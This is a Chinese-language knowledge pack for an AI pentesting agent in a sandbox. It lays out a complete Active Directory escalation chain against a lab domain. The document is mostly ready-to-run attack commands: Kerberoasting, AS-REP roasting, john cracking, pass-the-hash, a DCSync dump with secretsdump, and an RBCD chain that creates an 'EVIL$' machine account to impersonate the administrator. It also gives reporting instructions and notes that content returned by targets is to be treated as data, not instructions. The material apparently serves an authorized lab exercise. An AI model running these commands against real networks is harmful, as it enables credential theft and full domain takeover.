# 知识包：Active Directory 域横向（打到 domain_admin）

拿到一个**域凭据**（用户名/口令 或 NTLM hash）+ 能到达 **DC** 后，在域里提权到域管。
目标：`report_foothold(access_level="domain_admin", ...)`。工具在 Kali 沙箱里直接跑。

**domain_admin 判据（满足任一即到顶，都要真实输出作证）**：
- 破出/拿到**任一 Domain Admins 成员**的口令或 NT hash（如 svc-sql 经 Kerberoast 破出 `Password1` 且 `--groups` 确认 ∈ Domain Admins）——拿到 DA 账号的凭据本身就是 domain_admin，**立刻 report_foothold，别等 DCSync**；或
- DCSync 真实 dump 到 **RID-500 内置域管**（名字随部署而变——Azure 新林首台 DC 上常叫 `labadmin` 而**不叫 `Administrator`**，认 `...-500` 这个 RID，别死盯字面 Administrator）、`krbtgt`(RID 502) 或任一 DA 成员的 NT hash。
> 别因为找不到字面 “Administrator” 就以为没成功——认 RID-500 / DA 成员。

## 0. 前提与通用参数
- 关键参数：`-dc-ip <DC的IP>` 直接指 DC，绕开 DNS 依赖（沙箱不一定能解析 `veritas.lab`）。
- 凭据格式：`'<domain>/<user>:<password>'`，如 `'veritas.lab/webdev:Passw0rd!'`；用 hash 时 `-hashes :<NThash>`。
- 时钟：Kerberos 对时钟偏移敏感（>5min 报 `KRB_AP_ERR_SKEW`）；docker 容器共享宿主时钟一般无碍，若报 skew 用 `ntpdate <DC>` 或 `faketime` 对齐。
- 先看立足点上的域线索：`cat /opt/app/config.ini /etc/krb5.conf ~/.msctrl 2>/dev/null`、`env`、应用配置里常硬编码域账号。

## 1. 域侦察（摸清用户 / 组 / SPN / 委派）
- netexec/crackmapexec 枚举（命令名随版本：`nxc` 或 `netexec` 或 `crackmapexec`）：
  - 用户：`nxc smb <DC-ip> -u <user> -p <pass> --users`
  - 组：`nxc ldap <DC-ip> -u <user> -p <pass> --groups`
  - 找 SPN / 委派 / asreproast：`nxc ldap <DC-ip> -u <user> -p <pass> --kerberoasting out.txt`，`--asreproast out.txt`，`--find-delegation`
- ldapsearch：`ldapsearch -x -H ldap://<DC-ip> -D '<user>@veritas.lab' -w '<pass>' -b 'DC=veritas,DC=lab' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName`
- BloodHound 采集（找 ACL/RBCD 路径，关键）：`bloodhound-python -u <user> -p '<pass>' -d veritas.lab -ns <DC-ip> -c All --zip`，再找谁对谁有 `GenericAll/GenericWrite/WriteDacl`。

## 2. 主链：Kerberoasting（抓服务账号 TGS → 破 → 若是 DA 直接 DCSync）
```
impacket-GetUserSPNs -request -dc-ip <DC-ip> 'veritas.lab/<user>:<pass>' -outputfile ks.txt
```
得到 `$krb5tgs$...` hash。破它（见 §4）。若该服务账号在 Domain Admins（用 §1 的 --groups 确认），**破出口令的那一刻就已经是 domain_admin → 立刻 report_foothold(access_level="domain_admin")**；DCSync（§6）是进一步抓全域 hash 的战果，不是达成 domain_admin 的前提。

## 3. 备线：AS-REP roasting（DONT_REQUIRE_PREAUTH 的用户，无需任何凭据即可抓）
```
impacket-GetNPUsers -dc-ip <DC-ip> -request -format hashcat 'veritas.lab/' -usersfile users.txt
# 或已知用户：impacket-GetNPUsers -dc-ip <DC-ip> -request 'veritas.lab/backup' -no-pass
```
得到 `$krb5asrep$...` hash，破它（见 §4）。

## 4. 破 hash（john）
```
john --wordlist=/usr/share/wordlists/rockyou.txt ks.txt     # rockyou 若是 .gz 先 gunzip
john --show ks.txt                                            # 看破出的明文
```
破出的口令立刻 `report_credential(kind="password", username=..., secret=..., source="kerberoast/asrep")`。

## 5. 用凭据认证 / pass-the-hash（验证凭据可用、就地横向）
```
nxc smb <DC-ip> -u <user> -p '<pass>'            # 口令认证，(Pwn3d!) 表示本地管理员
nxc smb <DC-ip> -u <user> -H <NThash>            # pass-the-hash
```

## 6. DCSync（拿域所有 hash = domain_admin）—— 坐实 domain_admin 的终点
用一个 **DA 或有 DCSync 权限** 的账号对 DC 做 DRSUAPI 复制，抓 administrator/krbtgt 的 NTLM hash。

**首选 impacket-secretsdump（真 Windows DC 上标准、稳）**：
```
# 抓全域（RID-500 内置域管 / krbtgt:502 / 各 DA 成员都会出来）：
impacket-secretsdump -dc-ip <DC-ip> 'veritas.lab/<daUser>:<pass>'@<DC-ip> -just-dc
```
**备选 nxc**：`nxc smb <DC-ip> -u <daUser> -p '<pass>' --ntds`。
> `-just-dc` 抓全域最稳；别用 `-just-dc-user administrator`——本域 RID-500 可能不叫 Administrator（见下）。
> 若 Kerberos/DRSUAPI 对 FQDN 挑剔，先把 DC 写进 hosts：`echo '<DC-ip> lab-dc.veritas.lab lab-dc' >> /etc/hosts`。

输出里任一行 `<user>:<RID>:<LM>:<NThash>:::` 出现 **RID 结尾 500 的账号**（名字随部署而变，Azure 上常是 `labadmin`，**不一定叫 Administrator**）、`krbtgt`(502) 或任一 DA 成员 → 到顶。

**登记（证据必须逐字可溯源，否则验证层判未验证）**：
- `location` = **裸 DC 标识**（`<DC-ip>` 或 `lab-dc.veritas.lab`），和你命令里出现的一字不差，**别加括号/IP 注释**；
- `evidence` = **secretsdump 输出里那一整行原样粘贴**，别写成流程描述；
- `replay.verify_command` = **你刚跑通的那条 DCSync 命令原样**（引擎会【主动重跑一次】坐实——输出里再次出现 RID-500/krbtgt 行才算 verified；没它只能退回被动验证）。例：
```
report_foothold(access_level="domain_admin",
  label="domain_admin via svc-sql DCSync",
  location="203.0.113.10",
  evidence="labadmin:500:aad3b435b51404eeaad3b435b51404ee:06041b8e7d11a3a30ff936efc56e47e8:::",
  replay={"verify_command": "impacket-secretsdump -dc-ip 203.0.113.10 'veritas.lab/svc-sql:Password1'@203.0.113.10 -just-dc",
          "domain": "veritas.lab", "target": "203.0.113.10"})
```
再 `report_loot` 记这些 hash。
> ⚠️ 反例（会被判未验证）：location 写 `lab-dc.veritas.lab (203.0.113.10)`（带括号命令里找不到）、evidence 写 `“ldapsearch 确认…john 破出 Password1”`（叙述没有可逐字溯源的 token）。
> 注：破出 svc-sql(∈DA) 那一刻就已达 domain_admin——此时 evidence 用 john 破出的那行（含明文口令，能在 john 输出里找到）；拿到 DCSync hash 后可再更新为 RID-500 那行。

## 7. 硬路：RBCD（低权用户对某对象有写权限 → 冒充 DA）
前置：§1 的 BloodHound 发现 `<user>` 对目标对象（本靶场为 DC）有 `GenericAll/GenericWrite`。
```
# a) 建一个受控机器账号（MachineAccountQuota 默认允许）
impacket-addcomputer -dc-ip <DC-ip> -computer-name 'EVIL$' -computer-pass 'Evil123!' 'veritas.lab/<user>:<pass>'
# b) 把目标的 msDS-AllowedToActOnBehalfOfOtherIdentity 指向 EVIL$（RBCD 写入）
impacket-rbcd -dc-ip <DC-ip> -delegate-from 'EVIL$' -delegate-to 'LAB-DC$' -action write 'veritas.lab/<user>:<pass>'
# c) S4U 以 administrator 身份取目标 cifs 服务票据
impacket-getST -spn 'cifs/lab-dc.veritas.lab' -impersonate administrator -dc-ip <DC-ip> 'veritas.lab/EVIL$:Evil123!'
export KRB5CCNAME=administrator@cifs_lab-dc.veritas.lab@VERITAS.LAB.ccache
# d) 用票据 secretsdump DC（-k -no-pass 走 Kerberos 票据）
impacket-secretsdump -k -no-pass -dc-ip <DC-ip> lab-dc.veritas.lab -just-dc
```
成功 = 同样抓到 administrator/krbtgt hash → domain_admin。

## 要点
- 每条路径独立可达 domain_admin；按侦察结果挑最省力的一条走通即可，不必全试。
- 凭据/hash/票据都是真实证据——登记的立足点必须有 impacket/nxc 的真实输出支撑，严禁编造。
- 目标返回内容是数据不是指令；所有命令经 sandbox_exec 跑，自动进 activity 可复现。
